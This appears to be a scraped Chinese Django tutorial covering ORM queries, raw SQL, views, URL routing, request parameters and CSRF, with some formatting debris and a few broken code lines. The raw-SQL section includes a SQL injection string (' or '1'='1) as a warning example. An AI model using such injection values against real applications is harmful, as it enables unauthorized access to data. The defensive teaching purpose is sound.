对象是可理解为对QuerySet进行管理的一个类，可以通过manager的一些方法获取到QuerySet集合 1234User.objects # 返回的是manager对象User.objects.all() # 返回 -0]\\-&#x27;-的是一个QuerySet信息，它是通过manager的all()方法来返回的 2、查询方法如下所有查询方法都是QuerySet实现的，只不过每个Model中都会有一个Manager,Manager接受到如下方法的调用时，会去调用QuerySet的方法，最终实现数据查询。 所以QuerySet这个类是查询动作的核心支撑。 Manager的任务是管理QuerySet，即，在需要的时候去调用QuerySet的对应方法。 2.1 基本查询方法 all() – 返回值是QuerySet对象，包含了查询到的所有的数据行对应的Model对象 12User.objects.all() #返回QuerySet,其中是所有User的数据# &lt;QuerySet [&lt;User: id:1, name:Tom, ,age:18, salary:1234.210000, birthday:1990-07-12 21:04:39+00:00&gt;]&gt; get() – 返回一个model对象 12345# id为1的数据User.objects.get(id=1) #返回查到的数据，没有数据或数据多于1条 报错#name=&#x27;Mr_lee&#x27; 且 age=18的数据User.objects.get(name=&quot;Mr_lee&quot;,age=18) #返回查到的数据，没有数据或数据多于1条 报错 filter() – 返回QuerySet对象 123456#filter如果不穿参数 默认查所有#如果没有符合filter条件的数据,返回一个空的queryset#如果有多条数据符合查询条件,则返回一个queryset(内部有多个model对象)User.objects.filter(id=1) # 返回一个QuerySet,其中是满足条件的数据User.objects.filter(name=&#x27;Mr_lee&#x27;,age=18) # 可以有多条数据，如果没有数据，就返回一个空白的QuerySet count() 123User.objects.count() #数据数量User.objects.all().count() #数据数量 和上面等价User.objects.filter(age=18).count() # 查询年龄为18的数据行数 exclude() -QuerySet (了解) 12User.objects.exclude(pk=1) #和filter相反，取不满足条件的数据，返回QuerySetUser.objects.exclude(gender=True)# True/False 或者 1/0 和bool的filed比较 first() - 对象 （了解） 1User.objects.first() #获取QuerySet中的第一个元素，返回一个对象或None last() - 对象 （了解） 12User.objects.last() #获取QuerySet中的最后一个元素，返回一个对象或None(空queryset调用返回None)User.objects.filter(pk=1,name=&quot;Mr_lee&quot;).last() exists() - Boolean （了解） 1User.objects.exists() #User对应的表中是否有数据，判断数据表是否为空。返回True/False 补充：将QuerySet对象转为list 1list(User.objects.all()) 2.2 排序 order_by(‘列名’)1234User.objects.order_by(&quot;pk&quot;) #根据id升序，返回QuerySetUser.objects.all().order_by(&quot;age&quot;)User.objects.filter(age=18).order_by(&quot;-name&quot;) # User.objects.all().order_by(&quot;age&quot;,&quot;-name&quot;) #根据age升序，age相同的根据name倒序 2.3 限制操作取结果集中的某一部分数据 123456789User.objects.filter(pk=1,name=&quot;Mr_lee&quot;)[2] #返回QuerySet中第3个对象uname=&quot;Mr_lee&quot; #可以使用变量在查询中User.objects.filter(pk=1,name=uname)[2] #返回QuerySet中第3个对象User.objects.exclude(pk=1,name=&quot;Mr_lee&quot;)[1:3] #返回包含第[2,4)个对象(前闭后开)的新的QuerySet (子集)User.objects.exclude(pk=1,name=&quot;Mr_lee&quot;)[:3] # 等价于[0:3]User.objects.exclude(pk=1,name=&quot;Mr_lee&quot;)[2:] # 返回第3个到最后一个对象的新的QuerySet# 如果想用负的索引进行切片将queryset对象转成list对象 2.4 条件查询在众多查询方法中适合做条件查询的有：get(pk&#x3D;1)、filter(name&#x3D;”xx”)、exclude(pk&#x3D;1) get(pk&#x3D;1,name&#x3D;”Mr_lee”) 如此只是等值查询，远不能满足查询需求。 对于比较运算： 并不支持【&gt; &lt; &gt;&#x3D; &lt;&#x3D;】这些符号的操作，替换为关键字lt、gt、lte、gte 12345678User.objects.filter(pk__lt=10) #id小于10User.objects.filter(pk__gt=100,age__lte=18) #id大于100且age小于等于18#日期比较也可以User.objects.exclude(birthday__gte=&quot;2018-5-22 12:12:12&quot;) #yyyy-mm-dd HH:MM:SS格式User.objects.filter(birthday__gt=datetime.now())dd = &quot;2018-5-22 12:12:12&quot;#使用变量User.objects.exclude(birthday__gte=dd，name=&quot;xxx&quot;) #使用变量 2.5 模糊查询 contains、icontains 包含、包含（对大小写不敏感–忽略） “%xx%” startswith、istartswith 以..开始 “xx%” endswith、iendswith 以..结尾 “%xx” 12345678User.objects.filter(name__contains=&quot;s&quot;) #name中包含&quot;s&quot;User.objects.filter(name__icontains=&quot;s&quot;) #name中包含&quot;s&quot;或&quot;S&quot; 忽略大小写 ignoreUser.objects.filter(name__startswith=&quot;s&quot;)User.objects.filter(name__istartswith=&quot;s&quot;)# name是以&quot;s&quot;或&quot;S&quot;开始 忽略大小写User.objects.filter(name__endswith=&quot;s&quot;)User.objects.filter(name__iendswith=&quot;s&quot;)# name是以&quot;s&quot;或&quot;S&quot;结尾 忽略大小写 2.6 范围查询 in 在某个集合中 id__in&#x3D;(1,2,4) range 在某个范围中 id__range&#x3D;(2,5) 12345User.objects.filter(name__in=(&quot;Mr_lee&quot;,&quot;zz&quot;)) # where name in(&quot;Mr_lee&quot;,&quot;zz&quot;)User.objects.filter(age__in=(18,19,22))User.objects.filter(age__range=(18,20)) # where age between 18 and 20 [18,20]User.objects.filter(birthday__range=(&#x27;2018-05-10&#x27;,&#x27;2018-06-14&#x27;)) 2.7 空值查询123Employee.objects.filter(name=None)User.objects.filter(age__isnull=True) # 判断年龄是否为空 2.8 日期查询（了解） year month 1-12 day hour minute second week 一年的第几周 1-52 or 53 week_day 周几 周日&#x3D;1 周六&#x3D;7 123User.objects.filter(birthday__year=&quot;2018&quot;)User.objects.filter(birthday__month=&quot;1&quot;) # 生日是1月 可选值1-12User.objects.filter(birthday__week_day__gt=1) # 生日日期大于周日 2.9 映射查询-部分列select * from t_user; 查询全部列 select id,name from t_user;查询部分列–映射查询 values() 返回QuerySet对象，包含的元素都是dict 123456789User.objects.values() # 返回QuerySet对象，包含的元素都是dict User.objects.values()#查询部分列(返回QuerySet,其中每个元素都是一个dict)User.objects.all().values(&quot;pk&quot;) #等价写法：select id from t_user;User.objects.filter(age__lt=20).values(&quot;name&quot;) # select name from t_user where age&lt;20#select id,age from t_user where name like &quot;%m%&quot;User.objects.filter(name__contains=&quot;m&quot;).values(&quot;pk&quot;,&quot;age&quot;) 2.10 聚合函数(需要导包) - aggregate Max( ) Min( ) Avg( ) Sum( ) Count( ) 123456from django.db.models import Count, Max,Avg,Min,Sum#返回 &#123;&#x27;pk__max&#x27;: 4, &#x27;name__min&#x27;: &#x27;2134&#x27;&#125;User.objects.aggregate(Max(&quot;pk&quot;),Min(&#x27;salary&#x27;)) #select max(id),min(salary) from t_user;#可以定义别名，影响返回值结构 -- 返回 &#123;&#x27;mm&#x27;: 4, &#x27;name__min&#x27;: &#x27;2134&#x27;&#125;User.objects.aggregate(mm = Max(&quot;pk&quot;),Min(&#x27;salary&#x27;))#select max(id) as mm,min(salary) from t_user; 2.11 分组查询 - annotate\\语法： 12Models.objects.values(&#x27;age&#x27;).annotate(Max(&quot;salary&quot;)) # 分组查询时，是将values中的列作为分组条件的列 示例： 12User.objects.values(&#x27;age&#x27;).annotate(Count(&#x27;age&#x27;));# select age,Count(age) from userlist group by age; 12345678910111213141516#每种年龄中的用户的最大id和用户的最小生日#select age,max(id),min(birthday) from t_user group by ageUser.objects.values(&quot;age&quot;).annotate(Max(&#x27;pk&#x27;),Min(&#x27;birthday&#x27;))#大于18的每种年龄中的用户的最大id和用户的最小生日#加where : select age,max(id),min(birthday) from t_user where age &gt; 18 group by ageUser.objects.values(&quot;age&quot;).filter(age__gt=18).annotate(Max(&#x27;pk&#x27;),Min(&#x27;birthday&#x27;))#加别名User.objects.values(&quot;age&quot;).filter(age__gt=18).annotate(Min(&#x27;birthday&#x27;),mm=Max(&#x27;pk&#x27;))#加having : select age,max(id),min(salary) from t_user having max(id)&gt;3User.objects.values(&quot;age&quot;).annotate(Min(&#x27;salary&#x27;) ,p = Max(&#x27;id&#x27;)).filter(p__gt=3)#加排序User.objects.values(&quot;age&quot;).filter(age__gt=18).annotate(Min(&#x27;birthday&#x27;),mm=Max(&#x27;pk&#x27;)).order_by(&#x27;mm&#x27;) 2.12 F()和Q()函数User.objects.filter(id__gt&#x3D;1) #id大于1 问题：查询id大于age的用户？ 尝试：User.objects.filter(id__gt&#x3D;age)–错误 ​ User.objects.filter(id__gt&#x3D;”age”)–错误 当查询条件中需要另外的列时，可以使用F User.objects.filter(id__gt&#x3D;F(‘age’))–正确 12345from django.db.models import FUser.objects.filter(id__lt=F(&#x27;age&#x27;)) #id小于ageUser.objects.filter(id__lt=F(&#x27;age&#x27;)+1) #id小于age+1User.objects.filter(id__lt=F(&#x27;age&#x27;)*10/2) #id小于age*10/2User.objects.filter(id__lt=F(&#x27;age&#x27;)+F(&#x27;salary&#x27;)) #id小于age+salary User.objects.filter(id__lt&#x3D;2,name__contains&#x3D;”a”) #id小于2 而且 name包含“a” 问题：查询id小于2 或 name含有“a”的数据？ ​ 查询name不含有“a”的数据？ 当需要 “或 （|） 非（~）” 逻辑时，可以使用Q 12345678from django.db.models import QUser.objects.filter(Q(id__gt=3)|Q(id__lt=2)) #id大于3 或 id小于2User.objects.filter(Q(id__gt=3)|~Q(name__contains=&quot;Mr_lee&quot;)) #id大于3 或 name不含有“Mr_lee”User.objects.filter(Q(id__lt=3)|Q(age__gt=F(&quot;id&quot;)*10)) #id小于3 或 age大于id*10User.objects.filter(Q(id__gt=3)|Q(name__contains=&quot;Mr_lee&quot;)，age__lt=2) #id大于3 或 name包含&quot;Mr_lee&quot; 且 age小于2User.objects.filter(Q(id__gt=3)|Q(name__contains=&quot;Mr_lee&quot;)，~Q(age__lt=2) #id大于3 或 name包含&quot;Mr_lee&quot; 且 age不小于2 六、Raw-SQL-懒加载如果以上的支持不能满足需求，Django也支持直接执行原生SQL语句。 12345678910users = User.objects.raw(&quot;select id,name from userlist where id=1&quot;)users = User.objects.raw(&quot;select id,name from userlist where age=%s and name=%s&quot;,[18,&#x27;Mr_lee&#x27;])for user in users: print(user) # 注意不要在外部拼接sql字符串sql_str = &quot;select id,name from userlist where age=%d and name=&#x27;%s&#x27;&quot;%(18,&#x27;Mr_lee&#x27;)User.objects.raw(sql_str) # 会有sql注入风险 sql_str = &quot;select id,name from userlist where age=%d and name=&#x27;%s&#x27;&quot;%(18,&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;)","categories":[],"tags":[]},{"title":"","slug":"Django-Day02","date":"2024-10-24T11:20:58.338Z","updated":"2024-10-07T05:20:56.294Z","comments":true,"path":"2024/10/24/Django-Day02/","permalink":"http://example.com/2024/10/24/Django-Day02/","excerpt":"","text":"Django视图和URL配置一、MTV模式1、概述Django的MTV模式本质上和MVC是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django的MTV分别是值： M 代表模型（Model）：负责业务对象和数据库的关系映射(ORM)。 T 代表模板 (Template)：负责如何把页面展示给用户(html)。 V 代表视图（View）：负责业务逻辑，并在适当时候调用Model和Template。 Django中提供了View组件用来充当MVC中的C-controller。 2、view的主要职责 接收请求 调度Model，处理业务逻辑 响应请求 二、基本开发流程1、创建App，定义view中的函数在每个App的views.py中，定义一个hello函数 12def hello(request): # 必须要有一个request参数 print(&quot;函数&quot;) 2、函数返回响应每个view必须要有响应，即返回一个HttpResponse 123456from django.shortcuts import HttpResponsedef hello(request): return HttpResponse(&quot;&lt;h1&gt;view基本开发流程&lt;/h1&gt;&quot;)或者 return render(request,&#x27;xxx.html&#x27;) 3、定义访问路径在urls.py中，为每个view定义访问路径 1234567from django.urls import pathfrom view_app.views import hello # 引入views模块中的hello#from view_app import viewsurlpatterns = [ path(&quot;admin/&quot;,admin.site.urls), path(&quot;hello/&quot;,hello) # 添加view中的配置] 4、启动服务django内置了一个供开发使用的 web-服务器，虽然不适合生产环境，但用户开发测试，特别便利。 1234python manage.py runserver #默认ip和端口 localhost:8000 和使用 run启动是一样python manage.py runserver 0.0.0.0:8000 #修改默认的ip和端口python manage.py runserver 192.168.0.3:8899 注意：修改了ip和port后，需要到settings.py中增加一个设置：ALLOWED_HOSTS &#x3D; [“*”] 12345127.0.0.1:8000/hello/ 在浏览器中输入的URL该URL包含三部分： 1. 主机ip -- 服务器程序所在的电脑的ip地址 2. 端口号port 3. path-url 5、访问view123http://localhost:8000/hello/htpp://本机ip:8000/hello/ 1234567总结：启动服务器的几种方式# 1、python manage.py runserver == 在菜单项中点击run localhost:8000# 2、可以修改默认端口 python manage.py runserver 8899# 3、以第一种方式或第二种方式启动的服务器，只能使用 127.0.0.1 来访问 其它客户端无法访问# 4、如果想让其它电脑能够访问服务器，python manage.py runserver 自己电脑的ip:端口号# 还需要在settings.py文件中修改allowed_hosts=[&quot;自己电脑的ip&quot;]# 或者 python manage.py runserver 0.0.0.0:8899 -- allowed_hosts=[&quot;*&quot;] 三、URL配置URL配置的本质是 URL 模式以及要为该 URL 模式调用的视图函数之间的映射表。 该配置用于告诉 Django，对于这个 URL 调用这段代码，对于那个 URL 调用那段代码。 例如，当用户访问xxx&#x2F;hello时，调用视图函数hello()，这个视图函数存在于Python模块文件views.py中。 1、一般配置123456789from django.contrib import adminfrom django.urls import pathfrom view_app.views import hellourlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&#x27;hello/&#x27;,xxx) # http://localhost:8000/hello/ path(&#x27;hello/world/&#x27;,xxx) # http://localhost:8000/hello/world/ path(&#x27;hello/world/a/b/&#x27;,xxx) # http://localhost:8000/hello/world/a/b/] 2、正则配置123456789101112from django.contrib import adminfrom django.urls import path, re_path # 引入 re_path 函数from view_app.views import hellourlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), re_path(&quot;hello/\\\\d&#123;3&#125;/&quot;,hello), # localhost:8000/hello/三个整数/ re_path(r&quot;hello/\\d&#123;3&#125;/&quot;,hello), re_path(r&#x27;hello/\\d&#123;2,5&#125;/\\w+/&#x27;,hello), # locahost:8000/hello/12415/dfasdf # locahost:8000/hello/12415/abc/def/ re_path(r&quot;hello/[a-d]*/$&quot;), # localhost:8000/abchello/abcaa/ re_path(r&quot;^hello/[a-d]*/$&quot;), # localhost:8000/hello/abcaa/ ] 注意： 在使用正则时，^ 和 $ 可以保证精准匹配。 ^表示以什么开头， $ 表示以什么结尾。 3、URL技巧（path管理）一个Project会有很多App，每个App会有很多View函数，如果都在一个urls.py中配置，则项目的管理和维护成本将急剧上升。 每个App不仅逻辑独立，也希望在url-pattern的配置上也相互隔离。 因此我们希望每个App都应该有一个独立的url-conf，在每个app下创建一个新的urls.py文件，然后在全局的urls.py中来包含各个app的url-conf。 在App目录下，新建一个urls.py，并配置自己的url路径： 12345678from django.contrib import adminfrom django.urls import path,re_pathfrom view_app.views import hellourlpatterns = [ path(&#x27;hello/&#x27;,hello), re_path(r&#x27;hello/\\d&#123;2,5&#125;/\\w+/&#x27;,hello),] 在全局urls.py中，使用include包含各个app的url-conf： 1234567891011121314from django.contrib import adminfrom django.urls import path,re_path,inlcudefrom view_app.views import hellourlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&#x27;view_app/&#x27;,include(&quot;view_app.urls&quot;)), # 导入外部的urls模块 # view_app为 view_app.urls每一个path路径的前缀]# 如上的两个路径在访问时，都要加上全局路径中的view_app前缀# http://localhost:8000/view_app/hello# http://localhost:8000/view_app/hello/1243/abc 补充： ​ 如果在一个app的众多path中，又有关系逻辑关联紧密的path，可以进一步管理： 123456789101112131415from django.contrib import adminfrom django.urls import path,re_pathfrom view_app.views import hellourlpatterns = [ path(...), ... path(&#x27;user/vip&#x27;,include([ path(&#x27;a/&#x27;,view.helloa), # http://.../view_app/user/vip/a/ path(&#x27;b/&#x27;,view.hellob), # http://.../view_app/user/vip/b/ path(&#x27;c/&#x27;,view.helloc), # http://.../view_app/user/vip/c/ ])), ... path(...),] 至此：View的url配置则有了管理方案： 每个App定义自己的urls.py，其中定义自己的url-conf。 Project的全局urls.py中引入各个App的url-conf,并定义访问前缀，区分、隔离各个App App内部的url-conf可以根据逻辑进一步区分、隔离。 四、命名路径1、基本使用语法： 1path(&quot;xxx/&lt;参数名1&gt;/&lt;参数名2&gt;/../&quot;, xxx) # &lt;参数名1&gt; 此种路径可以匹配任何内容 示例： 12345path(&quot;hello/&lt;name&gt;/&lt;age&gt;/&quot;,views.hello) # localhost:8000/hello/mr_lee/18/def hello(request，name,age): print(name,age) ... 注意：有了命名路径，view的函数中必须有对应的接收参数。 2、命名路径转换器非正则命名路径中可以使用转换器，以约束每个路径捕获到的数据的类型 int：接收整数 str：字符串（了解） path：可以接收包含”&#x2F;“的路径（了解） 如果路径上的值不符合转换器类型，则访问不到对应的view函数（404页面） 123456path(&quot;hello/&lt;int: age&gt;/&lt;str: name&gt;/&quot;,hello)# http://localhost:8000/hello/18/Mrlee/def hello(request,age,name): print(age,name) return HttpResponse(&#x27;Done!&#x27;) 3、正则命名路径1、正则路径匹配且捕获数据使用正则的“捕获组”的格式（regex）也可捕获到url路径中的数据。 即用括号包围的正则，就是一个捕获组，不仅匹配路径，还可以捕获到数据。 1234567891011121314151617181920re_path(&quot;hello/(\\d&#123;3&#125;)/&quot;,hello1) # http://localhost:8000/hello/125/re_path(&quot;hello2/(d&#123;2,5&#125;)/(\\w+)/&quot;,hello2) # http://localhost:8000/hello2/43/abfa2_adre_path(&quot;hello3/([a-d]*)/&quot;,hello3) # http://localhost:8000/hello3/abcd/re_path(&quot;^hello4/([a-d]*)/$&quot;,hello4) # http://localhost:8000/hello4/abc # 注意hello3与hello4的区别def hello1(request,a): print(a) return HttpResponse(&quot;Done!&quot;)def hello2(request,a,b): print(a,b) return HttpResponse(&quot;Done!&quot;)def hello3(request,a): print(a) return HttpResponse(&quot;Done!&quot;)def hello4(request,a): print(a) return HttpResponse(&quot;Done!&quot;) 2、正则命名路径且捕获数据1234567891011121314151617181920re_path(&quot;hello/(?P&lt;age&gt;\\d&#123;3&#125;)/&quot;,hello1) # http://localhost:8000/hello/125/re_path(&quot;hello2/(?P&lt;age&gt;d&#123;2,5&#125;)/(?P&lt;name&gt;\\w+)/&quot;,hello2) # http://localhost:8000/hello2/43/ab_fre_path(&quot;hello3/(?P&lt;nick&gt;[a-d]*)/&quot;,hello3) # http://localhost:8000/hello3/abcdef/re_path(&quot;^hello4/(?P&lt;nick&gt;[a-d]*)/$&quot;,hello4) # http://localhost:8000/hello4/abc # 注意hello3与hello4的区别def hello(request,age): print(age) return HttpResponse(&quot;Done!&quot;)def hello2(request,age,name): print(age,name return HttpResponse(&quot;Done!&quot;)def hello3(request,nick) print(nick) return HttpResponse(&quot;Done!&quot;)def hello4(request,nick) print(nick) return HttpResponse(&quot;Done!&quot;) 1234567891011总结：# 目的：捕获url中的参数值# 1. 基本的命名路径 path(&quot;xxx/&lt;name&gt;/&lt;age&gt;/&quot;,xxx) 可以加转换器：限制参数的类型# def hello(request,name,age) 视图函数中的参数名要和path中的名字保持一致# 2. 正则路径捕获参数 re_path(&quot;xxx/(\\d&#123;3&#125;)&quot;,xxx)# def hello(request,a) 视图函数中的参数名字无要求# 3. 正则命名路径且捕获参数 re_path(&quot;xxx/(?P&lt;id&gt;\\d&#123;3&#125;）/&quot;,xxx)# def hello(request,id) 视图函数中的参数名要和path中的名字保持一致 五、请求处理(重中之重)（1）用户发送请求 （2）服务器接收请求 （3）服务器处理请求并返回响应 1、发送请求的形式在Web中发送页面请求的形式一般有三种： &lt;a href=&quot;xxx&quot;&gt; 超链接 location.href=&quot;xxx&quot; &lt;form action=&quot;xxx&quot;&gt; 表单 1234567891011121314151617181920&lt;html&gt;&lt;head&gt; &lt;title&gt;发送请求的三种方式&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function myclick() &#123; location.href = &quot;http://localhost:8000/hello/123&quot; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;&lt;a href=&quot;http://e.dangdang.com/products/1900470914.html&quot;&gt;打开&lt;/a&gt;&lt;/p&gt;&lt;form action=&quot;http://e.dangdang.com/products/1900671721.html&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;input type=&quot;button&quot; name=&quot;&quot; value=&quot;点我&quot; onclick=&quot;myclick()&quot;&gt;&lt;/body&gt;&lt;/html&gt; 2、接收请求参数客户端（浏览器）访问服务器时，需要向服务器传递数据（请求参数）。 方式一：接收路径中的参数 命名路径 正则路径 正则命名路径 方式二：常规的参数接收，通过request对象接收 3、超链接传参超链接传参格式： url/?key=value&amp;key2=value2 123456&lt;a href=&quot;http://localhost:8000/hello5/?id=115&amp;name=mr_lee&quot;&gt;超链接传参&lt;/a&gt; # html超链接path(&#x27;hello5/&#x27;,views.hello5) # url配置def hello5(request): # view函数 return HttpResponse(&quot;Done&quot;) 附：location.href传参与超链接传参类似。 4、表单传参表单中的控件，name属性值为参数名，value属性值为参数值。 12345&lt;for、m action=&quot;http://localhost:8000/hello6/&quot; method=&quot;get&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot; &gt; 密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 5、request接收请求参数5.1 接收get请求参数 request.GET[‘参数名’] request.GET.get(“参数名”) 12345path(&#x27;hello6/&#x27;, views.hello6)def hello6(request): print(request.GET[&#x27;name&#x27;],request.GET[&#x27;pwd&#x27;]) return HttpResponse(&quot;Done&quot;) 5.2 接收post请求参数 request.POST[‘参数名’] request.POST.get(“参数名”) 123456&lt;form action=&quot;http://localhost:8000/hello6/&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; 用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot; &gt; 密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 12345path(&#x27;hello6/&#x27;, views.hello6)def hello6(request): print(request.POST[&#x27;name&#x27;],request.POST[&#x27;pwd&#x27;]) return HttpResponse(&quot;Done&quot;) 注意： GET[‘age’] 如果没有键则报错 GET.get(‘age’) 如果没有键返回None 6、CSRFCSRF（Cross-site request forgery）跨站请求伪造，是一种常见的网络攻击手段。 7、CSRF基本使用Django为我们提供了防范CSRF攻击的机制。 默认情况下，使用django-admin startproject xxx命令创建工程时，CSRF防御机制就已经开启了。如果没有开启，请在MIDDLEWARE设置中添加’django.middleware.csrf.CsrfViewMiddleware’。 对于GET请求，一般来说没有这个问题，CSRF通常是针对POST方法的！ 在含有POST表单的模板中，需要在其&lt;form&gt;表单元素内部添加csrf_token标签，如下所示： 1234&lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; ....&lt;/form&gt; 8、CSRF实现原理 在发送请求时，通过CsrfViewMiddleware 在服务器端生成一个随机的token(令牌)，在render渲染模板时存放于form单的隐藏域和浏览器中 当再次form发送请求时，会携带隐藏域令牌和cookie中的令牌，此时CsrfViewMiddleware 会先于View执行，去判断两块令牌是否一致，验明正身。 9、Get和Post请求区别 POST安全性好于GET，GET中的请求参数直接暴露于url上；传递密码等敏感数据时，不使用GET。 GET对数据长度有限制,URL 的最大长度是 2048 个字符，POST无限制。 HTTP的语义中GET请求用来查询数据，POST用来提交数据 GET只允许 ASCII 字符。POST可以传递各种数据，二进制也可以。 GET可以缓存，POST不能缓存 实用技巧：请求中有隐私数据(如密码) 或 有较多数据时不建议使用Get 实用场景：Get常用来做查询和删除请求，Post常用来做增加和更新请求 10、接收多值参数 当请求参数中同一个key上有多个值，View中如何接收？ http://localhost:8000/test1/user/vip/a/?age=18&amp;age=19&amp;name=Mr_lee 123456&lt;form action=&quot;http://localhost:8000/hello7&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;football&quot;/&gt;足球 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;basketball&quot;/&gt;篮球 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;volleyball&quot;/&gt;排球 &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;&lt;/form&gt; hobby有多个值，GET[‘hobby’]得到的值是什么 ？ http://localhost:8000/hello7/?hobby=football&amp;hobby=basketball&amp;hobby=volleyball 123def hello7(request): print(request.GET[&#x27;hobby&#x27;]) #将只会得到最后一个值 return HttpResponse(&quot;&quot;) 使用GET.getlist(“xxx”)或POST.getlist(“xxx”)来接收多个相同key的值： 123def hello7(request): print(request.GET.getlist(&#x27;hobby&#x27;)) return HttpResponse(&quot;&quot;)","categories":[],"tags":[]},{"title":"","slug":"Django-Day01","date":"2024-10-24T11:20:58.337Z","updated":"2024-10-07T05:20:56.365Z","comments":true,"path":"2024/10/24/Django-Day01/","permalink":"http://example.com/2024/10/24/Django-Day01/","excerpt":"","text":"Django框架一、Django简介1、概述Django是一个开放源代码-免费-的Web应用框架，由Python写成，用于开发后台程序（服务器程序、后端程序）。 在众多的Python Web框架中Django是重量级选手中最有代表性的一位。许多成功的网站和APP都基于Django 框架: 程序员自己通过代码写的一个半成品软件,提供很多api,做二次开发 2、入门目标快速构建简易但完整的web项目，认识MTV结构，熟悉django开发流程。 二、Django环境搭建1、安装Django pip install django==2.0.6 检查是否安装成功cmd下进入python环境 ： 123import django django.VERSION 或 django.get_version() 三、创建Django项目1、命令行创建项目（跳过）安装 Django 之后，在虚拟环境的Scripts目录下已经有了可用的管理工具 django-admin.py&#x2F;django-admin.exe。我们可以使用 django-admin 来创建一个项目: 使用 django-admin 来创建 HelloWorld 项目： 1django-admin startproject HelloWorld 进入HelloWorld目录，输入以下命令，启动服务器： 1python manage.py runserver 在浏览器输入你服务器的ip及端口号 2、Pycharm创建项目 打开Pycharm，选择菜单项【File】-&gt;【New Project】-&gt;【Django】-&gt;【Location】-&gt;【Existing interprter】 3、项目目录结构12345678|-- helloworld |-- helloworld | |-- __init__.py | |-- settings.py | |-- urls.py | `-- wsgi.py `-- manage.py url:统一资源定位符 目录说明： helloworld: 项目的容器。 manage.py:是每个Django项目中自动生成的一个用于管理项目的脚本文件，需要通过python命令执行。 helloworld _ init _.py: 一个空文件，告诉 Python 该目录是一个 Python 包。 settings.py: 该 Django 项目的设置&#x2F;配置。 urls.py: 该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”。 wsgi.py: 一个 WSGI 兼容的 Web 服务器的入口，以便运行你的项目。 4、视图和URL配置4.1 创建视图在helloworld&#x2F;helloworld目录下创建一个views.py文件，并加入以下代码： 1234from django.http import HttpResponsedef hello(request): return HttpResponse(&quot;Hello world ! &quot;) # 小括号中的字符串最终会响应到前端页面 4.2 绑定url打开urls.py文件，并做如下修改： 123456from helloworld import views #引入views模块urlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&#x27;hello/&#x27;, views.hello), # view.hello函数 127.0.0.1:8000/hello] 我们使用 django.http.HttpResponse() 来输出”Hello World！”。该方式将HTML代码与Python代码混合在一起，不符合MVC思想。 4.3 MVC模式MVC 全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写，一种软件设计典范，用一种业务逻辑、数据、界面显示分离的方法组织代码。 M是指业务模型，V是指用户界面，C则是控制器，使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。C存在的目的则是确保M和V的同步，一旦M改变，V应该同步更新。 四、模板templates模板用于分离文档的表现形式和内容。 1、创建templates目录在helloworld根目录下创建一个templates目录。 2、创建html文件打开templates目录，并创建一个hello.html文件。 3、添加html内容在html文件中可以添加如下内容： 1&lt;h1&gt;hello&lt;/h1&gt; 4、修改settings.py接下来我们需要向Django说明模板文件的路径，修改helloworld&#x2F;settings.py，修改 TEMPLATES 中的 DIRS 为 &#39;DIRS&#39;: [os.path.join(BASE_DIR, &#39;templates&#39;)] ，如下所示: 5、修改views.py12345from django.shortcuts import render #render()函数 更简洁直接def hello(request): return render(request,&#x27;hello.html&#x27;) 五、创建APP项目的开发过程中，会有模块化开发，如电商系统中的用户模块，订单模块，OA系统中的财务模块，人力模块等。每个模块都是project的一个APP，APP内是相关模块的功能集合，包含所有相关的功能及完整的实现。将一个project划分为多个APP是一个解耦的过程，整个项目结构松散，利于维护。 一个app对应一个功能模块 在Pycharm的左下角的terminal中，执行如下命令（terminal中自动激活了当前项目所使用的虚拟环境）： 12python manage.py startapp firstapp app名称（模块名称） App目录结构如下： 1234567helloworld|-- firstapp| |-- __init__.py| |-- admin.py| |-- models.py| |-- tests.py| `-- views.py 添加app到settings.py中的INSTALL_APPS中（跳过）： 123456789INSTALLED_APPS = [ &#x27;django.contrib.admin&#x27;, &#x27;django.contrib.auth&#x27;, &#x27;django.contrib.contenttypes&#x27;, &#x27;django.contrib.sessions&#x27;, &#x27;django.contrib.messages&#x27;, &#x27;django.contrib.staticfiles&#x27;, &#x27;FirstApp&#x27;, # 新创建的app] 在views.py文件中加入如下代码： 1234from django.shortcuts import renderdef hello(request): return render(request,&#x27;hello.html&#x27;) 修改urls.py 123456789from django.contrib import adminfrom django.urls import pathfrom FirstApp import views # 引入views模块urlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&#x27;hello/&#x27;,views.hello), # 绑定url] 六、虚拟环境管理工具1、虚拟环境搭建在开发Python应用程序的时候，系统安装了Python3的一个版本：3.5。所有第三方的包都会被pip安装到Python3的site-packages目录下。 如果我们要同时开发多个应用程序，那这些应用程序都会共用一个Python，就是安装在系统的Python 3。如果应用A需要依赖jinja 2.7，而应用B需要依赖jinja 2.6怎么办？ 这种情况下，每个应用可能需要各自拥有一套“独立”的Python运行环境。virtualenv就是用来为一个应用创建一套“隔离”的Python运行环境。 虚拟环境–在当前主机上的，一个独立于本地环境的一个python运行环境 安装virtualenv 1pip install virtualenv 创建虚拟环境 cmd下进入某个目录，执行： 1virtualenv 